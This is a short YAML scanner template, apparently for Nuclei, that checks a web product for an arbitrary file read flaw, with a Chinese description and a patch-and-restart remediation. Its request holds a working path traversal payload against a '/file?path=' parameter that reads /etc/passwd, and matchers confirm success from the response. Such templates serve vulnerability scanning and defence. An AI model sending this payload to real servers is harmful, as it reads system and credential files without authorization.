id: local-file-include

info:
  name: local-file-include
  author: k3ppf0r
  severity: high
  description: |  
    该产品存在任意文件读取漏洞，攻击者可以利用漏洞读取服务器上的任意文件，包括配置文件等敏感信息。
  reference:
    - 
  remediation: |
    打对应补丁，重启服务
  classification:
    cve-id: 
    cvss-score: 7.5
    cwe-id: CWE-552
  metadata:
    date: 
    version: 
    fofa-query: 
  tags: lfi,leak,path

# ==================
#    本地文件包含
# ==================

http:
  - raw:
      - |
        GET /file?path=../../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
 
    matchers:
      - type: dsl
        dsl:
          - regex('root:.*:0:0:', body)
          - contains(header, "text/plain")
        condition: and